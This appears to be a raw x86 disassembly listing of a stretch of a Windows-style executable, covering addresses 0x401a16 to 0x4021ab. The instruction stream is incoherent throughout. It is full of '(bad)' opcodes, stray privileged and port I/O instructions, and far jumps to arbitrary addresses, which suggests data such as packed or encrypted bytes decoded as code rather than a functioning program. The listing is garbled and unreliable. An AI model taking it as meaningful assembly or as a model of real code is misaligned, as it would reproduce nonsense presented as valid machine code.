  401a16:	mul    DWORD PTR [esp+eax*4]
  401a19:	bound  ebp,QWORD PTR ds:0xb3f19454
  401a1f:	clc    
  401a20:	jnp    0x4019b4
  401a22:	cwde   
  401a23:	fptan  
  401a25:	jp     0x4019f7
  401a27:	xor    ch,BYTE PTR [edx+0x50b50cf]
  401a2d:	push   edi
  401a2e:	cdq    
  401a2f:	mov    es,eax
  401a31:	adc    eax,esp
  401a33:	inc    ebp
  401a34:	mov    ebx,0x69bb8bb4
  401a39:	push   ebp
  401a3a:	xchg   edi,eax
  401a3b:	mov    eax,0xde91946c
  401a40:	dec    ecx
  401a41:	int    0x51
  401a43:	xlat   BYTE PTR ds:[ebx]
  401a44:	inc    edx
  401a45:	xchg   edi,eax
  401a46:	xor    edi,DWORD PTR [ecx]
  401a48:	dec    eax
  401a49:	aaa    
  401a4a:	pop    eax
  401a4b:	push   ss
  401a4c:	fbld   TBYTE PTR [edi+0x21]
  401a4f:	pop    ebx
  401a50:	xor    BYTE PTR [esp+edi*4+0x63],0x83
  401a55:	xchg   edi,eax
  401a56:	pop    esp
  401a57:	lds    eax,FWORD PTR [eax-0x5647ef52]
  401a5d:	call   0x10543284
  401a62:	js     0x401a03
  401a64:	jmp    0xe71bbc8f
  401a69:	(bad)  
  401a6a:	xlat   BYTE PTR ds:[ebx]
  401a6b:	add    ebx,edi
  401a6d:	ss pop edi
  401a6f:	mov    al,0xd
  401a71:	or     al,0x8d
  401a73:	pop    ebp
  401a74:	idiv   dl
  401a76:	addr16 jge 0x401a8d
  401a79:	jno    0x401aca
  401a7b:	dec    esi
  401a7c:	push   0xffffffc8
  401a7e:	jb     0x401af9
  401a80:	cmp    al,0x96
  401a82:	hlt    
  401a83:	mov    al,ds:0x6ea588f3
  401a88:	lock sbb DWORD PTR [esi-0x7a],esi
  401a8c:	dec    ecx
  401a8d:	xchg   ebx,eax
  401a8e:	sbb    dh,ch
  401a90:	stos   DWORD PTR es:[edi],eax
  401a91:	mov    al,ds:0x11c33306
  401a96:	push   ss
  401a97:	clc    
  401a98:	lods   al,BYTE PTR ds:[esi]
  401a99:	xchg   esi,eax
  401a9a:	push   edx
  401a9b:	mov    ds:0x192bf829,al
  401aa0:	pusha  
  401aa1:	test   BYTE PTR [edx+esi*2-0x48],bh
  401aa5:	repz pop eax
  401aa7:	ins    BYTE PTR es:[edi],dx
  401aa8:	int    0x2e
  401aaa:	mov    eax,0x591a9e5c
  401aaf:	scas   ax,WORD PTR es:[edi]
  401ab1:	xlat   BYTE PTR ds:[ebx]
  401ab2:	jecxz  0x401b2b
  401ab4:	xor    BYTE PTR [ecx-0x2beb4d7e],bl
  401aba:	cs (bad) 
  401abc:	cmc    
  401abd:	jae    0x401a45
  401abf:	pop    es
  401ac0:	ficom  WORD PTR [edx-0x4855bbcb]
  401ac6:	mov    ds:0x32cb2a4a,al
  401acb:	add    BYTE PTR [esi],cl
  401acd:	dec    ebx
  401ace:	test   al,0xf1
  401ad0:	retf   0x8f4d
  401ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad4:	test   DWORD PTR [esi-0x65],ebp
  401ad7:	push   ebp
  401ad8:	dec    edi
  401ad9:	add    eax,0x1c6427e4
  401ade:	(bad)  
  401adf:	push   ebp
  401ae1:	cmp    eax,0xdb99cd5a
  401ae6:	jo     0x401a83
  401ae8:	jmp    0x85fbf956
  401aed:	out    dx,al
  401aee:	mov    al,0xca
  401af0:	xor    esi,edx
  401af2:	xchg   edx,eax
  401af3:	or     al,BYTE PTR [ebx]
  401af5:	pusha  
  401af6:	fsubr  st,st(2)
  401af8:	inc    esi
  401af9:	sti    
  401afa:	pusha  
  401afb:	jmpw   0xfc3e
  401aff:	adc    DWORD PTR [ebp-0x653de0d2],ecx
  401b05:	loope  0x401b70
  401b07:	xlat   BYTE PTR ds:[ebx]
  401b08:	and    bl,bl
  401b0a:	out    dx,eax
  401b0b:	call   0x1c72:0xcc4fbeae
  401b12:	sbb    DWORD PTR [esp+0x838461d],0xffffffd2
  401b1a:	fisub  WORD PTR [edi]
  401b1c:	fwait
  401b1d:	jnp    0x401b54
  401b1f:	jmp    0x95e3:0x57575497
  401b26:	mov    dl,0xbf
  401b28:	das    
  401b29:	fmul   DWORD PTR [esi-0x52]
  401b2c:	shl    dl,cl
  401b2e:	outs   dx,DWORD PTR ds:[esi]
  401b2f:	loopne 0x401af6
  401b31:	scas   eax,DWORD PTR es:[edi]
  401b32:	or     esi,ecx
  401b34:	int3   
  401b35:	fs pop ebx
  401b37:	xor    bh,dl
  401b39:	pop    ebp
  401b3a:	mov    eax,ds:0xca1f4a0a
  401b3f:	daa    
  401b40:	sar    DWORD PTR [edi-0x1],0x3a
  401b44:	jmp    0xd7754817
  401b49:	daa    
  401b4a:	push   ebp
  401b4b:	add    al,0xc2
  401b4d:	int3   
  401b4e:	out    0x25,al
  401b50:	fld    st(4)
  401b52:	xchg   edx,eax
  401b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b54:	mov    ebp,0xe796575c
  401b59:	sbb    al,0x23
  401b5b:	push   esi
  401b5c:	cmp    eax,0xb0a4654d
  401b61:	rcr    dh,cl
  401b63:	(bad)  
  401b65:	in     al,dx
  401b66:	fimul  WORD PTR ds:[edi+ebx*1+0x66]
  401b6b:	jmp    0xa54b659
  401b70:	cwde   
  401b71:	lods   eax,DWORD PTR ds:[esi]
  401b72:	sub    al,0xd2
  401b74:	inc    edx
  401b75:	fcom   st(5)
  401b77:	dec    edi
  401b78:	adc    bl,dl
  401b7a:	daa    
  401b7b:	shl    DWORD PTR [ebx],cl
  401b7d:	mov    dh,0x84
  401b7f:	mov    esi,0xd6358837
  401b84:	inc    eax
  401b85:	(bad)  
  401b86:	or     eax,0xe2833498
  401b8b:	sbb    ch,BYTE PTR [ecx]
  401b8d:	add    esp,DWORD PTR [edi-0x4ee734f7]
  401b93:	scas   al,BYTE PTR es:[edi]
  401b94:	test   al,0xdf
  401b96:	daa    
  401b97:	xor    esp,ebp
  401b99:	adc    DWORD PTR [edi+0x46],esp
  401b9c:	mov    dl,0x95
  401b9e:	cmp    eax,0x53e43c94
  401ba3:	lock data16 fwait
  401ba6:	dec    esp
  401ba7:	fcomp  DWORD PTR [ebx+eiz*4]
  401baa:	xchg   ebp,eax
  401bab:	aam    0x99
  401bad:	xchg   ecx,eax
  401bae:	mov    edi,0x587ef6b7
  401bb3:	xchg   BYTE PTR [esi],bl
  401bb5:	fucomp st(6)
  401bb7:	jno    0x401b8e
  401bb9:	cli    
  401bba:	fdiv   DWORD PTR [edx+edx*2-0x6bcb4e48]
  401bc1:	sbb    DWORD PTR [ebx],edx
  401bc3:	(bad)  
  401bc5:	cmp    DWORD PTR [edi],esi
  401bc7:	into   
  401bc8:	cmp    esi,esp
  401bca:	mov    ecx,0xd50d39d
  401bcf:	popa   
  401bd0:	add    eax,0x31909362
  401bd5:	jge    0x401bd1
  401bd7:	jmp    0x401be8
  401bd9:	inc    ecx
  401bda:	fsub   QWORD PTR [ebp+0x3bc193ad]
  401be0:	rcr    DWORD PTR [eax-0xab425aa],cl
  401be6:	fdiv   DWORD PTR [edi+edi*8+0x7f]
  401bea:	mov    dl,0x3d
  401bec:	xchg   edx,eax
  401bed:	jle    0x401b96
  401bef:	popa   
  401bf0:	jl     0x401b93
  401bf2:	ja     0x401ba4
  401bf4:	pop    eax
  401bf5:	xor    BYTE PTR [edx],ah
  401bf7:	sti    
  401bf8:	push   es
  401bf9:	scas   eax,DWORD PTR es:[edi]
  401bfa:	retf   0xb1e9
  401bfd:	and    BYTE PTR [ecx-0x1de8697d],bh
  401c03:	pop    es
  401c04:	push   edi
  401c05:	int3   
  401c06:	jl     0x401bca
  401c08:	mov    cl,0x44
  401c0a:	dec    edx
  401c0b:	sub    eax,0x22f8674f
  401c10:	push   esp
  401c11:	add    DWORD PTR [esi],esp
  401c13:	push   0xcc7c1619
  401c18:	stos   DWORD PTR es:[edi],eax
  401c19:	dec    ecx
  401c1a:	loope  0x401c7d
  401c1c:	retf   
  401c1d:	jae    0x401c2c
  401c1f:	leave  
  401c20:	lea    edi,[edx]
  401c22:	das    
  401c23:	popf   
  401c24:	outs   dx,BYTE PTR ds:[esi]
  401c25:	(bad)  
  401c26:	fstp   QWORD PTR [edi-0x71928f85]
  401c2c:	neg    BYTE PTR [ecx+eiz*1-0x44ac6aad]
  401c33:	stos   DWORD PTR es:[edi],eax
  401c34:	sub    BYTE PTR [ecx],ch
  401c36:	fmul   QWORD PTR [esi]
  401c38:	add    eax,0x71e98587
  401c3d:	hlt    
  401c3e:	xlat   BYTE PTR ds:[ebx]
  401c3f:	dec    esp
  401c40:	jmp    FWORD PTR [eax+0x36]
  401c43:	lock mov edi,0x52daae67
  401c49:	rcr    BYTE PTR [ebx+eax*1-0xf68d580],0x77
  401c51:	loopne 0x401c76
  401c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c54:	mov    edi,0x423e4bc6
  401c59:	or     cl,BYTE PTR [ecx]
  401c5b:	(bad)  [edi+0x4c]
  401c5e:	int    0x9a
  401c60:	int3   
  401c61:	jb     0x401c2c
  401c63:	imul   ebx,edx,0x834e0674
  401c69:	add    al,0xa4
  401c6b:	int3   
  401c6c:	jns    0x401c14
  401c6e:	dec    bl
  401c70:	jns    0x401c5d
  401c72:	rcl    DWORD PTR cs:[ecx-0x2f],cl
  401c76:	scas   eax,DWORD PTR es:[edi]
  401c77:	push   ebp
  401c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c79:	jp     0x401c15
  401c7b:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  401c7d:	mov    ebx,0x8948af30
  401c82:	push   es
  401c83:	lods   eax,DWORD PTR ds:[esi]
  401c84:	sbb    al,0xac
  401c86:	sbb    DWORD PTR [esi-0x70d0069f],esi
  401c8c:	int3   
  401c8d:	(bad)  
  401c8e:	out    0x45,eax
  401c90:	cmp    eax,DWORD PTR [esi+0x2fdcb635]
  401c96:	ins    DWORD PTR es:[edi],dx
  401c97:	fcom   QWORD PTR [ebx+0x3e]
  401c9a:	jbe    0x401cc9
  401c9c:	xchg   esp,eax
  401c9d:	(bad)  
  401c9e:	stc    
  401c9f:	nop
  401ca0:	adc    ch,bl
  401ca2:	fisub  WORD PTR [ebx-0x2d]
  401ca5:	ins    BYTE PTR es:[edi],dx
  401ca6:	add    BYTE PTR [esi+0x1d4e5b22],bl
  401cac:	mov    ch,0xe3
  401cae:	loope  0x401ca9
  401cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cb1:	mov    cl,0x5f
  401cb3:	shl    DWORD PTR [ecx],cl
  401cb5:	sbb    DWORD PTR fs:[edi],esp
  401cb8:	cld    
  401cb9:	idiv   BYTE PTR [eax-0x15455297]
  401cbf:	imul   edx,esp,0xffffff81
  401cc2:	cmp    BYTE PTR [ebp-0x3d],ch
  401cc5:	xor    eax,0xfffffffc
  401cc8:	icebp  
  401cc9:	idiv   DWORD PTR [ecx+0x2da4155f]
  401ccf:	xor    ch,BYTE PTR ds:[edx]
  401cd2:	mov    ebp,0xe3627df
  401cd7:	add    esi,eax
  401cd9:	pop    ecx
  401cda:	dec    ebp
  401cdb:	call   0x6c91:0x88a707c8
  401ce2:	push   ebp
  401ce3:	in     al,0x39
  401ce5:	icebp  
  401ce6:	fisttp QWORD PTR [edi]
  401ce8:	imul   esp,DWORD PTR [eax+0x61],0xffffffdc
  401cec:	test   bh,cl
  401cee:	lea    esi,[ebp-0x3c7d4a42]
  401cf4:	arpl   dx,di
  401cf6:	gs cs push edi
  401cf9:	cmp    eax,0x6b797a71
  401cfe:	cmc    
  401cff:	inc    edx
  401d00:	mov    bh,BYTE PTR fs:[ecx+0x7e915ba4]
  401d07:	cs call 0xba6e4f3e
  401d0d:	pop    ebp
  401d0e:	pop    DWORD PTR [edx]
  401d10:	xchg   ebx,eax
  401d11:	inc    ebp
  401d12:	push   DWORD PTR [ebp-0x5bbc51d6]
  401d18:	fld    st(3)
  401d1a:	fsub   QWORD PTR [ebp-0x3372d68]
  401d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d21:	je     0x401cfa
  401d23:	mov    eax,ds:0xc1b0844e
  401d28:	es ins DWORD PTR es:[edi],dx
  401d2a:	inc    ebp
  401d2b:	push   es
  401d2c:	imul   esi,DWORD PTR [ebx],0xffffffc1
  401d2f:	fiadd  DWORD PTR cs:[ecx+eax*2]
  401d33:	sahf   
  401d34:	ins    BYTE PTR es:[edi],dx
  401d35:	fild   QWORD PTR [ebx+0x4f45381f]
  401d3b:	mov    ecx,0x8eb315f6
  401d40:	pop    ds
  401d41:	fdivp  st(0),st
  401d43:	mov    edi,0x921c671b
  401d48:	cmp    edi,DWORD PTR [eax+0x1c]
  401d4b:	rcr    DWORD PTR [ecx-0x19],cl
  401d4e:	loopne 0x401cf5
  401d50:	mov    edi,0xbb6a7229
  401d55:	cmp    al,0x89
  401d57:	mul    BYTE PTR ds:0x90d7455a
  401d5d:	lock pop ss
  401d5f:	(bad)  
  401d60:	xor    esi,eax
  401d62:	pop    ss
  401d63:	(bad)  
  401d64:	cmp    bh,BYTE PTR [edx-0x65]
  401d67:	mov    WORD PTR [edi],ds
  401d69:	ret    0xa854
  401d6c:	es ret 0xb4d3
  401d70:	dec    eax
  401d71:	hlt    
  401d72:	pop    DWORD PTR [edx]
  401d74:	jle    0x401dea
  401d76:	mov    edx,0xfe56bd24
  401d7b:	les    ebx,FWORD PTR [ecx]
  401d7d:	packuswb mm6,QWORD PTR [ebx+0x2c930781]
  401d84:	or     eax,0x7e68efb6
  401d89:	div    BYTE PTR [ebx+esi*1+0x79]
  401d8d:	mov    ecx,0x5bc4f70a
  401d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d93:	mov    dl,0xf7
  401d95:	in     al,dx
  401d96:	shr    DWORD PTR [ebp+0x7d1da35a],1
  401d9c:	mov    cl,0x0
  401d9e:	hlt    
  401d9f:	add    ch,BYTE PTR gs:[esi+0x5d]
  401da3:	mov    edx,0x860b1ab
  401da8:	cli    
  401da9:	dec    ecx
  401daa:	aaa    
  401dab:	mov    al,ds:0x72996e18
  401db0:	and    BYTE PTR [edi],dh
  401db2:	mov    DWORD PTR [eax],ebp
  401db4:	push   ds
  401db5:	jns    0x401d64
  401db7:	xor    DWORD PTR [bx-0x51],eax
  401dbb:	sti    
  401dbc:	dec    ebp
  401dbd:	sbb    al,0xb1
  401dbf:	pusha  
  401dc0:	in     al,dx
  401dc1:	cli    
  401dc2:	mov    esi,0xa153644d
  401dc7:	dec    eax
  401dc8:	inc    esi
  401dc9:	dec    ebp
  401dca:	addr16 and bh,dh
  401dcd:	push   esi
  401dce:	ins    BYTE PTR es:[edi],dx
  401dcf:	and    al,0xbf
  401dd1:	push   ebx
  401dd2:	loope  0x401d59
  401dd4:	pop    edi
  401dd5:	or     al,0x4a
  401dd7:	push   ebx
  401dd8:	xchg   DWORD PTR [ebx+edi*2],esp
  401ddb:	push   ss
  401ddc:	stos   DWORD PTR es:[edi],eax
  401ddd:	dec    DWORD PTR [esi-0x5134a30b]
  401de3:	mov    eax,ds:0xdd5bd254
  401de8:	mov    dh,0x7c
  401dea:	pop    edx
  401deb:	push   ds
  401dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ded:	jne    0x401e26
  401def:	jle    0x401e22
  401df1:	(bad)  
  401df2:	xchg   ecx,eax
  401df3:	sbb    esi,DWORD PTR [edi+0x5b]
  401df6:	jecxz  0x401d97
  401df8:	repz jp 0x401d8e
  401dfb:	enter  0xc7d6,0xd3
  401dff:	mov    ds:0x66fef2bf,eax
  401e04:	jnp    0x401ddd
  401e06:	fs sub esp,edi
  401e09:	addr16 out dx,eax
  401e0b:	push   cs
  401e0c:	push   0xffffffb1
  401e0e:	out    dx,al
  401e0f:	lahf   
  401e10:	cmp    cl,BYTE PTR ds:0xa71507e4
  401e16:	inc    ecx
  401e17:	fisub  WORD PTR [edi+ebx*2+0x6f]
  401e1b:	(bad)  
  401e1d:	and    al,0x1c
  401e1f:	(bad)  
  401e20:	arpl   WORD PTR [esi],sp
  401e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e23:	push   ss
  401e24:	adc    ebp,DWORD PTR [ebx-0x320cf839]
  401e2a:	add    eax,0x67acf5f6
  401e2f:	in     eax,0xcf
  401e31:	lods   eax,DWORD PTR ds:[esi]
  401e32:	ss add al,0x80
  401e35:	sub    dl,dh
  401e37:	pop    ecx
  401e38:	sub    dh,BYTE PTR [esi-0x6c88bf79]
  401e3e:	shr    BYTE PTR cs:[ebx+0x5e33d563],cl
  401e45:	popa   
  401e46:	loope  0x401e4c
  401e48:	mov    dh,0x74
  401e4a:	mov    ah,BYTE PTR [ebp-0x45]
  401e4d:	stc    
  401e4e:	test   DWORD PTR [edi+0xdc3f55],eax
  401e54:	cmp    BYTE PTR ss:[esi+edx*4-0x3608ab77],bl
  401e5c:	mov    ah,0x46
  401e5e:	(bad)  
  401e5f:	js     0x401e62
  401e61:	arpl   WORD PTR [esi+0x5db238df],bx
  401e67:	out    0xf4,eax
  401e69:	or     dh,dh
  401e6b:	jb     0x401e3f
  401e6d:	push   edx
  401e6e:	outs   dx,DWORD PTR ds:[esi]
  401e6f:	mov    ebp,0x4be9ed85
  401e74:	mov    esi,0x73e2916
  401e79:	add    esi,DWORD PTR [edi]
  401e7b:	cli    
  401e7c:	pop    ecx
  401e7d:	ds or  eax,0xafe63945
  401e83:	sti    
  401e84:	aam    0x4a
  401e86:	xor    al,BYTE PTR [ebp-0x59]
  401e89:	psubsb mm1,QWORD PTR [esi]
  401e8c:	int3   
  401e8d:	(bad)  
  401e8e:	mov    edi,0x616ba4b5
  401e93:	cmp    al,0x1c
  401e95:	lods   al,BYTE PTR ds:[esi]
  401e96:	pop    edx
  401e97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e98:	mov    ebp,0xcba5a453
  401e9d:	sub    al,0xd4
  401e9f:	or     edx,edx
  401ea1:	fxch   st(0)
  401ea3:	xchg   ebx,eax
  401ea4:	aas    
  401ea5:	hlt    
  401ea6:	call   0xdb50:0x1aa71225
  401ead:	pusha  
  401eae:	xchg   ebx,eax
  401eaf:	mov    bh,0xcb
  401eb1:	jp     0x401e41
  401eb3:	(bad)  
  401eb4:	ret    0xe9e8
  401eb7:	icebp  
  401eb8:	sub    edx,ecx
  401eba:	sub    bh,BYTE PTR [ecx-0x68]
  401ebd:	add    dh,BYTE PTR [eax-0x1fe0df0b]
  401ec3:	or     DWORD PTR ds:0x96a84907,ebp
  401ec9:	xlat   BYTE PTR ds:[ebx]
  401eca:	or     eax,0xbd14f980
  401ecf:	sti    
  401ed0:	icebp  
  401ed1:	lods   eax,DWORD PTR ds:[esi]
  401ed2:	leave  
  401ed3:	jae    0x401e55
  401ed5:	data16 hlt 
  401ed7:	(bad)  
  401ed9:	fmulp  st(2),st
  401edb:	inc    edx
  401edc:	jp     0x401ee0
  401ede:	sbb    DWORD PTR [edx+ebx*4+0x2b],edi
  401ee2:	inc    edx
  401ee3:	ins    DWORD PTR es:[edi],dx
  401ee4:	push   ecx
  401ee5:	cmp    ebx,DWORD PTR [ecx+0x5e0e2c6]
  401eeb:	(bad)  
  401eec:	jmp    0x57f5c32
  401ef1:	int3   
  401ef2:	adc    al,0x83
  401ef4:	std    
  401ef5:	scas   al,BYTE PTR es:[edi]
  401ef6:	fs or  ch,bh
  401ef9:	sbb    ah,BYTE PTR [ebp+0x3a]
  401efc:	inc    eax
  401efd:	icebp  
  401efe:	fcomp  QWORD PTR [ebx]
  401f00:	cmp    BYTE PTR [ebx],ah
  401f02:	mov    ecx,DWORD PTR [ebp-0x6739cba6]
  401f08:	and    al,0xb1
  401f0a:	rcl    eax,0xa
  401f0d:	or     al,0x52
  401f0f:	lahf   
  401f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f11:	sub    DWORD PTR [eax+0x4d91655],ebx
  401f17:	dec    esi
  401f18:	lods   al,BYTE PTR ds:[esi]
  401f19:	lahf   
  401f1a:	mov    dh,0x16
  401f1c:	(bad)
  401f20:	(bad)  
  401f21:	dec    edi
  401f22:	xlat   BYTE PTR ds:[ebx]
  401f23:	sar    BYTE PTR [edx-0x63],0xad
  401f27:	shl    BYTE PTR [edi],1
  401f29:	das    
  401f2a:	sub    DWORD PTR [ebx-0x749b9754],edi
  401f30:	(bad)  [ebx]
  401f32:	test   DWORD PTR [ecx],0xe31eb518
  401f38:	pop    ds
  401f39:	scas   al,BYTE PTR es:[edi]
  401f3a:	imul   dh
  401f3c:	dec    ecx
  401f3d:	ja     0x401f23
  401f3f:	sbb    ebx,edx
  401f41:	mov    cl,0xdd
  401f43:	pop    edx
  401f44:	enter  0x9ed8,0x66
  401f48:	xchg   ebx,eax
  401f49:	sbb    eax,0xad4a9c7c
  401f4e:	jns    0x401fb1
  401f50:	ret    
  401f51:	lock mov eax,ds:0x72f33edf
  401f57:	push   edx
  401f58:	jl     0x401f60
  401f5a:	shl    eax,0x9e
  401f5d:	scas   eax,DWORD PTR es:[edi]
  401f5e:	inc    eax
  401f5f:	out    dx,al
  401f60:	push   es
  401f61:	xor    ch,BYTE PTR [ebx]
  401f63:	rol    BYTE PTR [ebp-0x7919ef60],1
  401f69:	aas    
  401f6a:	cdq    
  401f6b:	xchg   ecx,eax
  401f6c:	xchg   ebx,eax
  401f6d:	shr    DWORD PTR [eax],0x8b
  401f70:	test   al,0x31
  401f72:	jbe    0x401f83
  401f74:	call   0xc1abdb5
  401f79:	sbb    eax,0xf69f0f69
  401f7e:	int3   
  401f7f:	inc    ebp
  401f80:	mov    bh,0xb0
  401f82:	cmc    
  401f83:	clc    
  401f84:	rcr    DWORD PTR [ecx-0x60e290f7],0xcc
  401f8b:	add    eax,0x1b3450bf
  401f90:	stos   DWORD PTR es:[edi],eax
  401f91:	push   es
  401f92:	fs hlt 
  401f94:	sar    DWORD PTR [ebx+0x58a8433d],1
  401f9a:	pop    ss
  401f9b:	out    0x4a,eax
  401f9d:	gs shl eax,cl
  401fa0:	ffreep st(2)
  401fa2:	or     BYTE PTR [edx-0xe],0x98
  401fa6:	adc    BYTE PTR [edx-0x7f],ah
  401fa9:	fwait
  401faa:	xor    DWORD PTR ds:0x2e757309,esi
  401fb0:	bound  ebp,QWORD PTR [ebx]
  401fb2:	(bad)  
  401fb3:	bound  eax,QWORD PTR [edx+0x7033f415]
  401fb9:	sahf   
  401fba:	xchg   DWORD PTR [edx+0x6fb25ddb],edx
  401fc0:	retf   0xc8a6
  401fc3:	loopne 0x401f63
  401fc5:	adc    eax,0x8aaebb69
  401fca:	mov    cl,0x8e
  401fcc:	lock mov ebp,0x9e91ee5a
  401fd2:	mov    ebp,0x8ef007d0
  401fd7:	cmp    BYTE PTR [edx+0x2e1cd05d],0x55
  401fde:	and    esp,DWORD PTR [ebx]
  401fe0:	loope  0x402018
  401fe2:	cwde   
  401fe3:	xchg   ebp,eax
  401fe4:	mov    WORD PTR [ebp-0x155c7b4b],gs
  401fea:	push   ds
  401feb:	pop    eax
  401fec:	test   al,0xb
  401fee:	aam    0x20
  401ff0:	ret    0x3035
  401ff3:	or     dl,bl
  401ff5:	cmp    eax,0x465df08c
  401ffa:	fistp  WORD PTR [eax-0x51]
  401ffd:	rcl    DWORD PTR [edx+edi*4],0xc5
  402001:	xor    ah,BYTE PTR [ebp-0x2d]
  402004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402005:	fistp  WORD PTR ds:[eax+0x78b78374]
  40200c:	pop    ebp
  40200d:	and    al,0x57
  40200f:	mov    ds:0xaeec11bf,eax
  402014:	mov    BYTE PTR [edi+0x20bc917e],dl
  40201a:	enter  0x4595,0xfa
  40201e:	pop    edi
  40201f:	lea    eax,cs:[edx+0x71]
  402023:	fld    DWORD PTR [ecx]
  402025:	into   
  402026:	and    esi,DWORD PTR [edi]
  402028:	call   0x985e3a35
  40202d:	jns    0x402071
  40202f:	lea    ebx,[ecx]
  402031:	sbb    ah,bl
  402033:	xchg   ebx,eax
  402034:	mov    ebx,0x2ad8a215
  402039:	popa   
  40203a:	(bad)  
  40203b:	mov    edx,0x93d2262
  402040:	cmp    eax,0xfbc84c20
  402045:	xchg   edx,eax
  402046:	dec    ebp
  402047:	je     0x402035
  402049:	push   esp
  40204a:	sti    
  40204b:	cmp    BYTE PTR [esi-0x38f5a13],dl
  402051:	cmp    bl,BYTE PTR [ebx]
  402053:	sahf   
  402054:	mov    eax,0xca922651
  402059:	xor    BYTE PTR [ebp+0x74],bh
  40205c:	hlt    
  40205d:	push   ebx
  40205e:	int3   
  40205f:	neg    BYTE PTR [esi]
  402061:	cmc    
  402062:	cmp    edx,edx
  402064:	mov    DWORD PTR [edi-0xf],ebp
  402067:	test   al,0x87
  402069:	jo     0x401ffb
  40206b:	inc    esi
  40206c:	addr16 ret 
  40206e:	sub    BYTE PTR [ebx+0x28df80d6],bh
  402074:	inc    ebp
  402075:	in     eax,0xaa
  402077:	loopne 0x4020f0
  402079:	shr    DWORD PTR [esi-0x137d6532],1
  40207f:	das    
  402080:	push   ecx
  402081:	sti    
  402082:	adc    eax,0x85e5933e
  402087:	jne    0x4020c0
  402089:	pop    es
  40208a:	jg     0x4020eb
  40208c:	pusha  
  40208d:	push   ecx
  40208e:	lock jb 0x402093
  402091:	(bad)  
  402093:	gs daa 
  402095:	mov    esp,ebp
  402097:	push   es
  402098:	cmp    ebx,DWORD PTR [esi+edx*4-0x5e]
  40209c:	repz push esi
  40209e:	popa   
  40209f:	arpl   cx,ax
  4020a1:	xchg   ecx,eax
  4020a2:	aas    
  4020a3:	pushf  
  4020a4:	jle    0x4020c3
  4020a6:	pop    es
  4020a7:	int3   
  4020a8:	lahf   
  4020a9:	mov    edx,0x2c1c8451
  4020ae:	fimul  DWORD PTR [edi+ecx*8-0x7]
  4020b2:	loope  0x4020c7
  4020b4:	in     al,dx
  4020b5:	push   esi
  4020b6:	mov    eax,0x5f5a5356
  4020bb:	mov    esi,es
  4020bd:	pop    esi
  4020be:	jg     0x402076
  4020c0:	push   eax
  4020c1:	jo     0x402101
  4020c3:	adc    DWORD PTR [edi+0x640c701a],edx
  4020c9:	bound  esi,QWORD PTR gs:[edx]
  4020cc:	jbe    0x402095
  4020ce:	cmp    bl,ch
  4020d0:	mov    ds:0x17fb1b31,al
  4020d5:	mov    esp,0xc2438bf0
  4020da:	call   0xe50a:0x80e3ee01
  4020e1:	popf   
  4020e2:	cmp    DWORD PTR [eax-0x23689b20],0x7376eeb9
  4020ec:	push   esp
  4020ed:	mov    dh,0x49
  4020ef:	xchg   edx,eax
  4020f0:	retf   0x35b0
  4020f3:	jb     0x402088
  4020f5:	pop    edx
  4020f6:	jb     0x402095
  4020f8:	dec    ecx
  4020f9:	repz push ds
  4020fb:	test   DWORD PTR [edi],edx
  4020fd:	xor    al,0x52
  4020ff:	mov    DWORD PTR [edx-0xc],eax
  402102:	push   ecx
  402103:	sub    BYTE PTR [esi],dl
  402105:	pop    esp
  402106:	mov    esp,0x93e99d59
  40210b:	mov    ch,0x78
  40210d:	test   BYTE PTR [esi+0x3be735ed],dl
  402113:	jne    0x402171
  402115:	adc    dh,BYTE PTR [ebp+eiz*8+0x61c3690d]
  40211c:	jne    0x402115
  40211e:	out    0x6b,al
  402120:	lods   eax,DWORD PTR ds:[esi]
  402121:	iret   
  402122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402123:	stos   DWORD PTR es:[edi],eax
  402124:	inc    eax
  402125:	mov    WORD PTR [edx+ebp*4+0x5e],es
  402129:	in     al,dx
  40212a:	shr    DWORD PTR ds:0x1cfa67b4,0xd7
  402131:	outs   dx,WORD PTR ds:[esi]
  402133:	(bad)  
  402134:	mov    eax,0xc25ea157
  402139:	shl    BYTE PTR [ebp+ebx*8+0x78],0xb8
  40213e:	pop    DWORD PTR [ebp-0x526efa3]
  402144:	xor    eax,0xdc66fe26
  402149:	add    al,0x28
  40214b:	inc    eax
  40214c:	xor    edx,DWORD PTR [edx-0x3b1ae722]
  402152:	idiv   edi
  402154:	dec    ecx
  402155:	cmc    
  402156:	pusha  
  402157:	xor    al,0xde
  402159:	in     al,0xd3
  40215b:	fs jne 0x4021d8
  40215e:	inc    ebx
  40215f:	push   ds
  402160:	push   es
  402161:	mov    DWORD PTR [edi-0x3f43dd5e],ebx
  402167:	add    al,0xf
  402169:	or     al,0x95
  40216b:	pop    esp
  40216c:	imul   esp,DWORD PTR [ecx],0x6b
  40216f:	push   ebp
  402170:	pop    eax
  402171:	add    al,0x9c
  402173:	clc    
  402174:	aam    0x78
  402176:	xor    al,0x37
  402178:	xchg   ebx,eax
  402179:	mov    bh,0xb8
  40217b:	mov    bh,0x2c
  40217d:	xchg   esi,eax
  40217e:	jo     0x4021e3
  402180:	das    
  402181:	push   ss
  402182:	adc    DWORD PTR [eax+0x4c09f137],ecx
  402188:	inc    edi
  402189:	out    0x4d,eax
  40218b:	adc    al,0x15
  40218d:	jbe    0x402168
  40218f:	test   al,0xfb
  402191:	pop    es
  402192:	(bad)  
  402193:	(bad)  
  402194:	fcomi  st,st(3)
  402196:	inc    edi
  402197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402198:	mov    dh,0xa8
  40219a:	loope  0x40220f
  40219c:	jmp    0x40215b
  40219e:	cmp    BYTE PTR [edx+0x74],al
  4021a1:	dec    ebx
  4021a2:	fcom   QWORD PTR [edx+0x5a7f5338]
  4021a8:	lea    edi,[ebx-0x69]
  4021ab:	arpl   di,cx
